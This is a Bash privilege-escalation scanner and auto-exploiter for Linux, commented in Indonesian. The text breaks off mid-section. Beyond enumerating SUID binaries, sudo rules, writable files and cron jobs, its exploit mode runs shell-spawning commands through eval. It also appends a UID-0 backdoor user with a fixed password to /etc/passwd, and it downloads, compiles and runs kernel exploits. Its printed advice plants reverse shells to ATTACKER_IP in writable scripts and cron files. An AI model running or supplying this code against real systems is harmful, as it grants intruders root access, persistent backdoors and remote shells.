#!/bin/bash

################################################################################
# Linux Privilege Escalation Enumeration Tool
# Comprehensive script to find privilege escalation vulnerabilities
################################################################################

# Enhanced Colors
RED='\033[0;31m'
BRIGHT_RED='\033[1;31m'
GREEN='\033[0;32m'
BRIGHT_GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
BRIGHT_BLUE='\033[1;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
GRAY='\033[0;37m'
NC='\033[0m' # No Color

# Exploit mode — aktifkan dengan --exploit atau -x
EXPLOIT_MODE=0
for _arg in "$@"; do
    case "$_arg" in
        --exploit|-x) EXPLOIT_MODE=1 ;;
    esac
done

# Progress counter
TOTAL_CHECKS=32
CURRENT_CHECK=0

# Vulnerability counters
CRITICAL_COUNT=0
WARNING_COUNT=0
SUID_COUNT=0
SUDO_VULN_COUNT=0
WRITABLE_COUNT=0
CRON_VULN_COUNT=0
KERNEL_VULN_COUNT=0

clear
echo -e "${RED}"
cat << "EOF"
      ░▒▓█▓▒░░▒▓██████▓▒░ ░▒▓██████▓▒░ ░▒▓███████▓▒░ 
    ░▒▓████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
       ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
       ░▒▓█▓▒░░▒▓███████▓▒░░▒▓███████▓▒░▒▓███████▓▒░  
       ░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
       ░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
       ░▒▓█▓▒░░▒▓██████▓▒░ ░▒▓██████▓▒░ ░▒▓██████▓▒░  
EOF
echo -e "${NC}"
echo -e "                                                  "
echo -e "                 [ ${RED}Linux PrivEsc Scanner${NC} ]  "
echo -e "                      = t.me/1996hub =            "
echo ""

if [ "$EXPLOIT_MODE" -eq 1 ]; then
    echo -e "${BRIGHT_RED}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BRIGHT_RED}║  [!!!] EXPLOIT MODE AKTIF — Setiap vuln akan ditawarkan untuk dieksploitasi ║${NC}"
    echo -e "${BRIGHT_RED}║  Gunakan hanya di environment sendiri / groovy / pentest authorized  ║${NC}"
    echo -e "${BRIGHT_RED}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
else
    echo -e "${CYAN}[*] Mode: SCAN ONLY  |  Tambahkan flag --exploit atau -x untuk auto-exploit${NC}"
    echo ""
fi

OUTPUT_FILE="privilege_escalation_report_$(date +%Y%m%d_%H%M%S).txt"
EXPLOIT_FILE="exploit_methods_$(date +%Y%m%d_%H%M%S).txt"

# Fungsi logging
log() {
    echo -e "$1" | tee -a "$OUTPUT_FILE"
}

log_exploit() {
    echo -e "$1" | tee -a "$EXPLOIT_FILE"
}

# Progress bar
progress() {
    CURRENT_CHECK=$((CURRENT_CHECK + 1))
    PERCENT=$((CURRENT_CHECK * 100 / TOTAL_CHECKS))
    BAR_LENGTH=50
    FILLED=$((PERCENT * BAR_LENGTH / 100))
    BAR=$(printf "%${FILLED}s" | tr ' ' '█')
    EMPTY=$(printf "%$((BAR_LENGTH - FILLED))s" | tr ' ' '░')
    echo -ne "\r${CYAN}[${BAR}${EMPTY}] ${PERCENT}% - Checking: $1${NC}"
}

# Section header dengan box yang lebih menarik
section() {
    echo ""
    echo -e "${BRIGHT_GREEN}"
    echo "╔══════════════════════════════════════════════════════════════════════╗"
    printf "║ %-68s ║\n" "$1"
    echo "╚══════════════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    log ""
    log "═══════════════════════════════════════════════════════════════════════"
    log "$1"
    log "═══════════════════════════════════════════════════════════════════════"
}

# Warning dengan icon
warning() {
    WARNING_COUNT=$((WARNING_COUNT + 1))
    echo -e "${YELLOW}[!] WARNING:${NC} $1" | tee -a "$OUTPUT_FILE"
}

# Critical dengan icon
critical() {
    CRITICAL_COUNT=$((CRITICAL_COUNT + 1))
    echo -e "${BRIGHT_RED}[!!!] CRITICAL:${NC} $1" | tee -a "$OUTPUT_FILE"
}

# Info dengan icon
info() {
    echo -e "${BLUE}[*]${NC} $1" | tee -a "$OUTPUT_FILE"
}

# Success dengan icon
success() {
    echo -e "${GREEN}[+]${NC} $1" | tee -a "$OUTPUT_FILE"
}

# Exploit method box
show_exploit() {
    local vuln_name="$1"
    local exploit_method="$2"
    local example="$3"
    
    echo -e "${MAGENTA}"
    echo "┌──────────────────────────────────────────────────────────────────────┐"
    echo "│ EXPLOIT METHOD: $vuln_name"
    echo "├──────────────────────────────────────────────────────────────────────┤"
    echo -e "${NC}"
    echo -e "${CYAN}Method:${NC}"
    echo -e "$exploit_method"
    if [ -n "$example" ]; then
        echo ""
        echo -e "${YELLOW}Example:${NC}"
        echo -e "${GRAY}$example${NC}"
    fi
    echo -e "${MAGENTA}└──────────────────────────────────────────────────────────────────────┘${NC}"
    echo ""
    
    log_exploit ""
    log_exploit "═══════════════════════════════════════════════════════════════════════"
    log_exploit "EXPLOIT: $vuln_name"
    log_exploit "═══════════════════════════════════════════════════════════════════════"
    log_exploit "Method: $exploit_method"
    if [ -n "$example" ]; then
        log_exploit ""
        log_exploit "Example:"
        log_exploit "$example"
    fi
    log_exploit ""
}

# Jalankan exploit secara interaktif (hanya jika --exploit aktif)
run_exploit() {
    local name="$1"
    local cmd="$2"

    [ "$EXPLOIT_MODE" -eq 0 ] && return

    echo ""
    echo -e "${BRIGHT_RED}┌──────────────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${BRIGHT_RED}│  [AUTO-EXPLOIT] ${WHITE}$name${NC}"
    echo -e "${BRIGHT_RED}└──────────────────────────────────────────────────────────────────────┘${NC}"
    echo -e "${YELLOW}CMD:${NC} $cmd"
    echo -ne "${CYAN}Jalankan exploit ini? [y/N/q=stop exploit mode]: ${NC}"
    read -r -t 30 _answer 2>/dev/null || _answer="n"

    case "$_answer" in
        y|Y)
            echo -e "${BRIGHT_GREEN}[*] Menjalankan exploit...${NC}"
            log_exploit "[EXECUTED] $name"
            log_exploit "CMD: $cmd"
            eval "$cmd"
            echo -e "${BRIGHT_GREEN}[*] Exploit selesai. Jika sudah dapat shell, ketik 'exit' untuk kembali.${NC}"
            ;;
        q|Q)
            echo -e "${YELLOW}[*] Exploit mode dinonaktifkan.${NC}"
            EXPLOIT_MODE=0
            ;;
        *)
            echo -e "${GRAY}[*] Dilewati.${NC}"
            ;;
    esac
    echo ""
}

# Tambah user root baru ke /etc/passwd (groovy quick win)
exploit_add_root_user() {
    local username="${1:-groovy}"
    local password="${2:-groovy1669}"

    if command -v openssl >/dev/null 2>&1; then
        HASH=$(openssl passwd -1 "$password" 2>/dev/null)
    elif command -v perl >/dev/null 2>&1; then
        HASH=$(perl -e "use crypt; print crypt('$password', '\$1\$salt\$');" 2>/dev/null)
    else
        HASH="password"
    fi

    echo "${username}:${HASH}:0:0:root:/root:/bin/bash" >> /etc/passwd
    echo -e "${BRIGHT_GREEN}[+] User '${username}' ditambahkan ke /etc/passwd dengan UID 0!${NC}"
    echo -e "${BRIGHT_GREEN}[+] Gunakan: su ${username}  (password: ${password})${NC}"
    log_exploit "[+] Added root user: $username to /etc/passwd"
    su "$username"
}

# ── Kernel version helpers ──────────────────────────────────────────────────
# kver_ge: return 0 jika kernel saat ini >= a.b.c
kver_ge() {
    local a="$1" b="$2" c="${3:-0}"
    [ "$KERNEL_MAJOR" -gt "$a" ] 2>/dev/null && return 0
    [ "$KERNEL_MAJOR" -eq "$a" ] && [ "$KERNEL_MINOR" -gt "$b" ] 2>/dev/null && return 0
    [ "$KERNEL_MAJOR" -eq "$a" ] && [ "$KERNEL_MINOR" -eq "$b" ] && [ "${KPATCH:-0}" -ge "$c" ] 2>/dev/null && return 0
    return 1
}
# kver_le: return 0 jika kernel saat ini <= a.b.c
kver_le() {
    local a="$1" b="$2" c="${3:-999}"
    [ "$KERNEL_MAJOR" -lt "$a" ] 2>/dev/null && return 0
    [ "$KERNEL_MAJOR" -eq "$a" ] && [ "$KERNEL_MINOR" -lt "$b" ] 2>/dev/null && return 0
    [ "$KERNEL_MAJOR" -eq "$a" ] && [ "$KERNEL_MINOR" -eq "$b" ] && [ "${KPATCH:-0}" -le "$c" ] 2>/dev/null && return 0
    return 1
}

# ── Auto download-compile-run kernel exploit ─────────────────────────────────
kernel_auto_exploit() {
    local cve="$1" url="$2" compile="$3" run="$4"
    [ "$EXPLOIT_MODE" -eq 0 ] && return

    echo ""
    echo -e "${BRIGHT_RED}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BRIGHT_RED}║  [KERNEL AUTO-EXPLOIT] $cve${NC}"
    echo -e "${BRIGHT_RED}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo -e "${YELLOW}Source :${NC} $url"
    echo -ne "${CYAN}Download, compile & jalankan? [y/N/q=stop kernel exploits]: ${NC}"
    read -r -t 30 _ka 2>/dev/null || _ka="n"

    case "$_ka" in
        y|Y)
            _kdir=$(mktemp -d /tmp/kexp_XXXXX)
            echo -e "${YELLOW}[*] Workdir: $_kdir${NC}"
            cd "$_kdir" || return 1

            # Download
            if command -v git >/dev/null 2>&1 && echo "$url" | grep -qE "github\.com"; then
                git clone --depth=1 "$url" exp 2>&1 | tail -2
                [ -d exp ] && cd exp
            elif command -v wget >/dev/null 2>&1; then
                wget -q "$url" -O exp.c
            elif command -v curl >/dev/null 2>&1; then
                curl -sSL "$url" -o exp.c
            else
                echo -e "${RED}[-] Tidak ada downloader (git/wget/curl)${NC}"; return 1
            fi

            echo -e "${YELLOW}[*] Compiling: $compile${NC}"
            if eval "$compile" 2>&1; then
                echo -e "${BRIGHT_GREEN}[+] Compile OK!${NC}"
                log_exploit "[KERNEL EXPLOIT EXECUTED] $cve"
                eval "$run"
                [ "$(id -u)" -eq 0 ] && echo -e "${BRIGHT_GREEN}[!!!] ROOT DIPEROLEH via $cve !!!${NC}" && log_exploit "[ROOT GAINED] $cve"
            else
                echo -e "${RED}[-] Compile gagal. Manual: cd $_kdir/exp && $compile && $run${NC}"
            fi
            ;;
        q|Q) EXPLOIT_MODE=0 ;;
        *) echo -e "${GRAY}[*] Dilewati.${NC}" ;;
    esac
    echo ""
}

# ── Array untuk self-root engine ─────────────────────────────────────────────
VULN_CVES=()

# Start logging
log "╔═══════════════════════════════════════════════════════════════════════╗"
log "║   Linux Privilege Escalation Enumeration Report                       ║"
log "╚═══════════════════════════════════════════════════════════════════════╝"
log ""
log "Generated: $(date)"
log "User: $(whoami)"
log "Hostname: $(hostname)"
log "Kernel: $(uname -r)"
log "OS: $(cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d'"' -f2 || echo 'Unknown')"
log ""

################################################################################
# 1. SYSTEM INFORMATION
################################################################################
progress "System Information"
section "1. SYSTEM INFORMATION"

info "Current user: $(whoami)"
info "User ID: $(id)"
info "Groups: $(groups)"
info "Home directory: $HOME"
info "Current directory: $(pwd)"
info "Shell: $SHELL"
info "PATH: $PATH"
info "Sudo version: $(sudo -V 2>/dev/null | head -n1 || echo 'Not available')"

log ""
info "Users with shell access:"
cat /etc/passwd 2>/dev/null | grep -v nologin | grep -v false | cut -d: -f1,7 | tee -a "$OUTPUT_FILE"

log ""
info "Sudoers configuration:"
if [ -r /etc/sudoers ]; then
    grep -v "^#" /etc/sudoers 2>/dev/null | grep -v "^$" | tee -a "$OUTPUT_FILE"
else
    warning "Cannot read /etc/sudoers"
fi

if [ -d /etc/sudoers.d ]; then
    info "Sudoers.d files:"
    for file in /etc/sudoers.d/*; do
        if [ -r "$file" ]; then
            log "  File: $file"
            grep -v "^#" "$file" 2>/dev/null | grep -v "^$" | tee -a "$OUTPUT_FILE"
        fi
    done
fi

################################################################################
# 2. SUID/SGID BINARIES
################################################################################
progress "SUID/SGID Binaries"
section "2. SUID/SGID BINARIES"

SUID_FOUND=0
EXPLOITABLE_SUID=()

info "Finding SUID binaries..."
# List of commonly exploitable SUID binaries (only show these)
EXPLOITABLE_SUID_LIST=("find" "python" "python3" "vim" "nano" "less" "more" "nmap" "bash" "sh" "perl" "ruby" "php" "node" "npm" "docker" "kubectl" "gdb" "strace" "tcpdump" "wireshark" "base64" "xxd" "timeout" "nice" "taskset" "ionice" "stdbuf" "setarch" "unshare" "pkexec" "cp" "mv" "cat" "tail" "head" "awk")

find / -perm -4000 -type f 2>/dev/null | while read -r file; do
    if [ -f "$file" ] && [ -x "$file" ]; then
        basename_file=$(basename "$file")
        # Only show if it's in our exploitable list and not in standard system paths
        IS_EXPLOITABLE=0
        for exploitable in "${EXPLOITABLE_SUID_LIST[@]}"; do
            if [ "$basename_file" = "$exploitable" ]; then
                # Check if it's not a standard system binary (which usually drop privileges)
                if ! echo "$file" | grep -qE "^/(usr/)?(bin|sbin)/"; then
                    IS_EXPLOITABLE=1
                    break
                elif [ "$basename_file" = "find" ] || [ "$basename_file" = "python" ] || [ "$basename_file" = "python3" ] || [ "$basename_file" = "vim" ] || [ "$basename_file" = "nano" ] || [ "$basename_file" = "less" ] || [ "$basename_file" = "more" ] || [ "$basename_file" = "nmap" ] || [ "$basename_file" = "bash" ] || [ "$basename_file" = "sh" ] || [ "$basename_file" = "perl" ] || [ "$basename_file" = "ruby" ] || [ "$basename_file" = "docker" ] || [ "$basename_file" = "gdb" ] || [ "$basename_file" = "strace" ] || [ "$basename_file" = "pkexec" ]; then
                    # These are always potentially exploitable even in standard paths
                    IS_EXPLOITABLE=1
                    break
                fi
            fi
        done
        
        if [ "$IS_EXPLOITABLE" -eq 1 ]; then
            log "  ${YELLOW}SUID:${NC} $file"
            ls -la "$file" 2>/dev/null | tee -a "$OUTPUT_FILE"
            critical "Potentially exploitable SUID binary: $file"
            EXPLOITABLE_SUID+=("$file")
            SUID_COUNT=$((SUID_COUNT + 1))
            
            # Show exploit method based on binary
            case "$basename_file" in
                find)
                    show_exploit "SUID find Binary" \
                        "Use find to execute commands with root privileges." \
                        "find / -name test -exec /bin/bash -p \;"
                    run_exploit "SUID find ->shell" "$file / -name . -exec /bin/bash -p \\;"
                    ;;
                bash|sh)
                    show_exploit "SUID bash/sh Binary" \
                        "If bash/sh has SUID, it may drop privileges. Try: bash -p" \
                        "bash -p\n# or\n./bash -p"
                    run_exploit "SUID $basename_file ->shell" "$file -p"
                    ;;
                python|python3)
                    show_exploit "SUID Python Binary" \
                        "Python can execute system commands. Import os and execute commands." \
                        "python3 -c 'import os; os.system(\"/bin/bash\")'\n# or\npython3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"
                    run_exploit "SUID $basename_file ->shell" "$file -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"
                    ;;
                vim|nano)
                    show_exploit "SUID Editor Binary ($basename_file)" \
                        "Use editor to read/write files or escape to shell." \
                        "$basename_file\n# In vim: :!/bin/bash\n# In nano: ^R^X then bash"
                    run_exploit "SUID $basename_file ->shell" "$file -c ':!/bin/bash' /dev/null"
                    ;;
                less|more)
                    show_exploit "SUID Pager Binary ($basename_file)" \
                        "Use pager to escape to shell." \
                        "$basename_file /etc/passwd\n# Then type: !/bin/bash"
                    run_exploit "SUID $basename_file ->shell" "echo '' | $file -c '!/bin/bash'"
                    ;;
                nmap)
                    show_exploit "SUID Nmap Binary" \
                        "Older nmap versions support interactive mode. Use --interactive then !sh" \
                        "nmap --interactive\nnmap> !sh"
                    run_exploit "SUID nmap ->shell" "$file --interactive"
                    ;;
                docker)
                    show_exploit "SUID Docker Binary" \
                        "Docker can be used to escape to host. Run container with root on host." \
                        "docker run -v /:/mnt -it alpine chroot /mnt bash"
                    run_exploit "SUID docker ->host root shell" "docker run -v /:/mnt --rm -it alpine chroot /mnt bash"
                    ;;
                gdb)
                    show_exploit "SUID GDB Binary" \
                        "GDB can execute shell commands." \
                        "gdb -nx -ex 'python import os; os.setuid(0)' -ex 'python os.system(\"/bin/bash\")' -ex quit"
                    run_exploit "SUID gdb ->shell" "$file -nx -ex 'python import os; os.setuid(0)' -ex 'python os.system(\"/bin/bash\")' -ex quit"
                    ;;
                strace)
                    show_exploit "SUID Strace Binary" \
                        "Strace can execute commands via -e option." \
                        "strace -o /dev/null /bin/bash"
                    run_exploit "SUID strace ->shell" "$file -o /dev/null /bin/bash -p"
                    ;;
                perl)
                    show_exploit "SUID Perl Binary" \
                        "Perl can execute system commands." \
                        "perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/bash\";'"
                    run_exploit "SUID perl ->shell" "$file -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/bash\";'"
                    ;;
                ruby)
                    show_exploit "SUID Ruby Binary" \
                        "Ruby can execute system commands." \
                        "ruby -e 'Process::Sys.setuid(0); exec \"/bin/bash\"'"
                    run_exploit "SUID ruby ->shell" "$file -e 'Process::Sys.setuid(0); exec \"/bin/bash\"'"
                    ;;
                pkexec)
                    show_exploit "SUID pkexec Binary" \
                        "pkexec may be vulnerable to PwnKit (CVE-2021-4034)." \
                        "Check for PwnKit exploit: https://github.com/arthepsy/CVE-2021-4034"
                    ;;
            esac
        fi
    fi
done

log ""
info "Finding SGID binaries..."
find / -perm -2000 -type f 2>/dev/null | while read -r file; do
    if [ -f "$file" ]; then
        log "  ${YELLOW}SGID:${NC} $file"
        ls -la "$file" 2>/dev/null | tee -a "$OUTPUT_FILE"
    fi
done

log ""
info "Finding files with both SUID and SGID..."
find / -perm -6000 -type f 2>/dev/null | while read -r file; do
    if [ -f "$file" ]; then
        critical "SUID+SGID: $file"
        ls -la "$file" 2>/dev/null | tee -a "$OUTPUT_FILE"
    fi
done

################################################################################
# 3. SUDO PERMISSIONS
################################################################################
progress "Sudo Permissions"
section "3. SUDO PERMISSIONS"

if command -v sudo >/dev/null 2>&1; then
    info "Checking sudo permissions for current user..."
    SUDO_OUTPUT=$(sudo -l 2>/dev/null)
    echo "$SUDO_OUTPUT" | tee -a "$OUTPUT_FILE"
    
    if echo "$SUDO_OUTPUT" | grep -q "NOPASSWD"; then
        warning "User can run commands without password!"
        show_exploit "Sudo NOPASSWD" \
            "Commands with NOPASSWD can be executed without password. Check which commands are allowed." \
            "sudo -l\n# Then execute allowed commands:\nsudo <allowed_command>"
        run_exploit "Sudo NOPASSWD ->root shell" "sudo /bin/bash"
    fi

    # Check for specific dangerous commands (only if they appear in actual sudo rules)
    # More selective - only flag if command appears in a rule that allows execution
    if echo "$SUDO_OUTPUT" | grep -qiE "\(ALL\)|NOPASSWD.*ALL|ALL.*NOPASSWD"; then
        critical "Sudo ALL permission found - can execute any command!"
        show_exploit "Sudo ALL Permission" \
            "User can run ALL commands as root without restrictions." \
            "sudo su\n# or\nsudo /bin/bash"
        run_exploit "Sudo ALL ->root shell" "sudo /bin/bash"
    fi
    
    # Check for dangerous commands only if they're in actual sudo rules
    dangerous_commands=("vim" "nano" "less" "more" "find" "python" "python3" "perl" "ruby" "bash" "sh" "docker" "tar" "zip" "unzip" "git")
    for cmd in "${dangerous_commands[@]}"; do
        # Only flag if command appears in a sudo rule (not just mentioned anywhere)
        if echo "$SUDO_OUTPUT" | grep -qiE "\(ALL\)|NOPASSWD.*$cmd|$cmd.*NOPASSWD|\(ALL:ALL\).*$cmd"; then
            critical "Dangerous sudo permission found: $cmd"
            
            case "$cmd" in
                ALL)
                    show_exploit "Sudo ALL Permission" \
                        "User can run ALL commands as root without restrictions." \
                        "sudo su\n# or\nsudo /bin/bash"
                    run_exploit "Sudo ALL ->root shell" "sudo /bin/bash"
                    ;;
                vim|nano)
                    show_exploit "Sudo Editor ($cmd)" \
                        "Use editor to read/write files or escape to shell." \
                        "sudo $cmd /etc/passwd\n# In vim: :!/bin/bash"
                    run_exploit "Sudo $cmd ->root shell" "sudo $cmd -c ':!/bin/bash' /dev/null"
                    ;;
                less|more)
                    show_exploit "Sudo Pager ($cmd)" \
                        "Use pager to escape to shell." \
                        "sudo $cmd /etc/passwd\n# Then: !/bin/bash"
                    run_exploit "Sudo $cmd ->root shell" "echo '' | sudo $cmd -c '!/bin/bash'"
                    ;;
                python|python3)
                    show_exploit "Sudo Python" \
                        "Python can execute system commands with root privileges." \
                        "sudo python3 -c 'import os; os.system(\"/bin/bash\")'"
                    run_exploit "Sudo $cmd ->root shell" "sudo $cmd -c 'import os; os.system(\"/bin/bash\")'"
                    ;;
                perl)
                    show_exploit "Sudo Perl" \
                        "Perl can execute system commands with root privileges." \
                        "sudo perl -e 'exec \"/bin/bash\";'"
                    run_exploit "Sudo perl ->root shell" "sudo perl -e 'exec \"/bin/bash\";'"
                    ;;
                ruby)
                    show_exploit "Sudo Ruby" \
                        "Ruby can execute system commands with root privileges." \
                        "sudo ruby -e 'exec \"/bin/bash\"'"
                    run_exploit "Sudo ruby ->root shell" "sudo ruby -e 'exec \"/bin/bash\"'"
                    ;;
                find)
                    show_exploit "Sudo Find" \
                        "Find can execute commands." \
                        "sudo find / -name test -exec /bin/bash \\;"
                    run_exploit "Sudo find ->root shell" "sudo find / -name . -exec /bin/bash \\;"
                    ;;
                tar)
                    show_exploit "Sudo Tar" \
                        "Tar can execute commands via checkpoint action." \
                        "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash"
                    run_exploit "Sudo tar ->root shell" "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash"
                    ;;
                zip|unzip)
                    show_exploit "Sudo Archive Tools ($cmd)" \
                        "Archive tools can be used to read/write files or execute commands." \
                        "sudo $cmd -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash"
                    ;;
                git)
                    show_exploit "Sudo Git" \
                        "Git can execute arbitrary commands via hooks or config." \
                        "sudo git -p help config\n# Then type: !/bin/bash"
                    run_exploit "Sudo git ->root shell" "sudo git -p help config"
                    ;;
                awk)
                    show_exploit "Sudo Awk" \
                        "Awk can execute system commands." \
                        "sudo awk 'BEGIN {system(\"/bin/bash\")}'"
                    run_exploit "Sudo awk ->root shell" "sudo awk 'BEGIN {system(\"/bin/bash\")}'"
                    ;;
                docker)
                    show_exploit "Sudo Docker" \
                        "Docker can be used to escape to host with root privileges." \
                        "sudo docker run -v /:/mnt -it alpine chroot /mnt bash"
                    run_exploit "Sudo docker ->host root shell" "sudo docker run -v /:/mnt --rm -it alpine chroot /mnt bash"
                    ;;
                env)
                    show_exploit "Sudo Env" \
                        "Env can be used to execute arbitrary commands." \
                        "sudo env /bin/bash"
                    run_exploit "Sudo env ->root shell" "sudo env /bin/bash"
                    ;;
                cp)
                    show_exploit "Sudo Cp" \
                        "Cp can overwrite sensitive files like /etc/passwd." \
                        "# Copy backdoored passwd:\nsudo cp /tmp/passwd /etc/passwd"
                    ;;
            esac
        fi
    done
    
    # Check for sudo version vulnerabilities (only if user has sudo access)
    if echo "$SUDO_OUTPUT" | grep -q "may run"; then
        SUDO_VERSION=$(sudo -V 2>/dev/null | head -n1 | grep -oP 'Sudo version \K[0-9.]+' || echo "")
        if [ -n "$SUDO_VERSION" ]; then
            MAJOR=$(echo "$SUDO_VERSION" | cut -d. -f1)
            MINOR=$(echo "$SUDO_VERSION" | cut -d. -f2)
            PATCH=$(echo "$SUDO_VERSION" | cut -d. -f3 | cut -dp -f1 2>/dev/null || echo "0")
            
            # CVE-2019-14287 (sudo < 1.8.28) - only if user has restricted sudo
            if echo "$SUDO_OUTPUT" | grep -q "!root"; then
                if [ "$MAJOR" -eq 1 ] && [ "$MINOR" -lt 8 ]; then
                    critical "Vulnerable to CVE-2019-14287 (sudo < 1.8.28) - can bypass !root restriction"
                    show_exploit "CVE-2019-14287 (Sudo Bypass)" \
                        "If user has ALL=(ALL, !root) permission, can bypass with UID -1." \
                        "sudo -u#-1 /bin/bash"
                elif [ "$MAJOR" -eq 1 ] && [ "$MINOR" -eq 8 ] && [ -n "$PATCH" ] && [ "$PATCH" -lt 28 ]; then
                    critical "Vulnerable to CVE-2019-14287 (sudo < 1.8.28) - can bypass !root restriction"
                    show_exploit "CVE-2019-14287 (Sudo Bypass)" \
                        "If user has ALL=(ALL, !root) permission, can bypass with UID -1." \
                        "sudo -u#-1 /bin/bash"
                fi
            fi
            
            # CVE-2021-3156 (sudo 1.8.2 - 1.8.31p2, 1.9.0 - 1.9.5p1)
            if [ "$MAJOR" -eq 1 ]; then
                if [ "$MINOR" -eq 8 ]; then
                    if [ -n "$PATCH" ] && [ "$PATCH" -ge 2 ] && [ "$PATCH" -lt 32 ]; then
                        critical "Vulnerable to CVE-2021-3156 (Baron Samedit) - sudo 1.8.2 to 1.8.31p2"
                        show_exploit "CVE-2021-3156 (Baron Samedit)" \
                            "Heap-based buffer overflow in sudo. Exploit available on GitHub." \
                            "Check: https://github.com/blasty/CVE-2021-3156\nsudoedit -s /"
                    fi
                elif [ "$MINOR" -eq 9 ]; then
                    if [ -z "$PATCH" ] || [ "$PATCH" -eq 0 ] || ([ -n "$PATCH" ] && [ "$PATCH" -lt 6 ]); then
                        critical "Vulnerable to CVE-2021-3156 (Baron Samedit) - sudo 1.9.0 to 1.9.5p1"
                        show_exploit "CVE-2021-3156 (Baron Samedit)" \
                            "Heap-based buffer overflow in sudo. Exploit available on GitHub." \
                            "Check: https://github.com/blasty/CVE-2021-3156"
                    fi
                fi
            fi
        fi
    fi
else
    warning "sudo command not found"
fi

################################################################################
# 4. WORLD-WRITABLE FILES AND DIRECTORIES
################################################################################
progress "World-Writable Files"
section "4. WORLD-WRITABLE FILES AND DIRECTORIES"

info "Finding world-writable files (excluding /proc, /sys, /dev)..."
WW_FILES=0
find / -type f -perm -002 ! -path "/proc/*" ! -path "/sys/*" ! -path "/dev/*" ! -path "/tmp/*" ! -path "/var/tmp/*" 2>/dev/null | head -50 | while read -r file; do
    if [ -f "$file" ] && [ -w "$file" ]; then
        # Only flag if it's a script, service file, or binary
        if echo "$file" | grep -qE "(\.sh$|\.py$|\.pl$|\.rb$|\.php$|service|init\.d|\.conf$|\.config$|\.ini$)" || file "$file" 2>/dev/null | grep -qiE "(script|executable|binary)"; then
            WW_FILES=1
            log "  ${YELLOW}World-writable:${NC} $file"
            ls -la "$file" 2>/dev/null | tee -a "$OUTPUT_FILE"
            critical "World-writable script/service file: $file"
            show_exploit "World-Writable Script" \
                "Modify the script to add reverse shell or add user." \
                "echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> $file\n# Or add user:\necho 'user:$(openssl passwd -1 password):0:0:root:/root:/bin/bash' >> /etc/passwd"
        fi
    fi
done

log ""
info "Finding world-writable directories..."
find / -type d -perm -002 ! -path "/proc/*" ! -path "/sys/*" ! -path "/dev/*" ! -path "/tmp/*" ! -path "/var/tmp/*" 2>/dev/null | head -50 | while read -r dir; do
    if [ -d "$dir" ] && [ -w "$dir" ]; then
        # Only flag if it's in PATH or is a system directory
        if echo "$PATH" | grep -q "$dir"; then
            log "  ${YELLOW}World-writable dir:${NC} $dir"
            ls -lad "$dir" 2>/dev/null | tee -a "$OUTPUT_FILE"
            critical "World-writable directory in PATH: $dir"
            show_exploit "World-Writable PATH Directory" \
                "Create malicious binary with same name as system command in this directory." \
                "echo -e '#!/bin/bash\n/bin/bash' > $dir/ls\nchmod +x $dir/ls\n# When root runs 'ls', your script executes"
        elif echo "$dir" | grep -qE "(etc|opt|usr/local|var/www|home)"; then
            # System directories that shouldn't be world-writable
            log "  ${YELLOW}World-writable dir:${NC} $dir"
            ls -lad "$dir" 2>/dev/null | tee -a "$OUTPUT_FILE"
            warning "World-writable system directory: $dir"
        fi
    fi
done

################################################################################
# 5. CRON JOBS
################################################################################
progress "Cron Jobs"
section "5. CRON JOBS"

info "System-wide cron jobs (/etc/crontab):"
if [ -r /etc/crontab ]; then
    CRON_CONTENT=$(cat /etc/crontab 2>/dev/null)
    echo "$CRON_CONTENT" | tee -a "$OUTPUT_FILE"
    
    # Check for wildcards or writable scripts
    if echo "$CRON_CONTENT" | grep -qE "\*|\.sh|\.py"; then
        warning "Cron job contains wildcards or scripts - check for exploitation"
    fi
else
    warning "Cannot read /etc/crontab"
fi

log ""
info "Cron directories:"
for dir in /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.weekly /etc/cron.monthly; do
    if [ -d "$dir" ]; then
        log "  Directory: $dir"
        ls -la "$dir" 2>/dev/null | tee -a "$OUTPUT_FILE"
        for file in "$dir"/*; do
            if [ -f "$file" ] && [ -r "$file" ]; then
                log "    File: $file"
                FILE_CONTENT=$(cat "$file" 2>/dev/null)
                echo "$FILE_CONTENT" | tee -a "$OUTPUT_FILE"
                
                # Check if script is writable
                if [ -w "$file" ]; then
                    critical "Writable cron file: $file"
                    show_exploit "Writable Cron File" \
                        "Modify the cron file to execute your payload as root." \
                        "echo '* * * * * root /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> $file"
                fi
            fi
        done
    fi
done

log ""
info "User cron jobs:"
USER_CRON=$(crontab -l 2>/dev/null)
if [ $? -eq 0 ]; then
    echo "$USER_CRON" | tee -a "$OUTPUT_FILE"
else
    info "No user cron jobs found"
fi

log ""
info "Checking for writable cron files..."
find /etc/cron* -type f -writable 2>/dev/null | while read -r file; do
    critical "Writable cron file: $file"
    show_exploit "Writable Cron File" \
        "Add malicious cron job that runs as root." \
        "echo '* * * * * root /bin/bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"' >> $file"
done

################################################################################
# 6. CAPABILITIES
################################################################################
progress "Linux Capabilities"
section "6. LINUX CAPABILITIES"

if command -v getcap >/dev/null 2>&1; then
    info "Files with capabilities:"
